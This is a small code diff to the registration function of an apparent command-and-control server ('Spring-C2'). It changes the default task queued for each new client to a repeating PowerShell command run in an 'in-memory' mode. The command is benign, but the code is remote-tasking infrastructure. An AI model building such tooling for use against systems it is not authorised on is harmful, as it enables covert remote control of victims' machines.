@@ -1,17 +1,19 @@
 from server import db
 from server.models import User, Task
 from datetime import datetime, timedelta
+from server.task_modes import TaskMode
 
 def register_user(username, client_id):
     status = "Successfully registered." # Debugging purposes
     
     # Dummy Task
-    dummy_command = "echo Hello from Spring-C2!"
+    dummy_command = "Write-Host -ForegroundColor Red '####################'"
     dummy_task = Task(
         client_id=client_id,
         command=dummy_command,
+        command_mode=TaskMode.IN_MEMORY_PS.value,
         repeat_interval=60,
-        run_once=True,
+        run_once=False,
         next_execution=datetime.utcnow() + timedelta(seconds=30)
     )
     db.session.add(dummy_task)
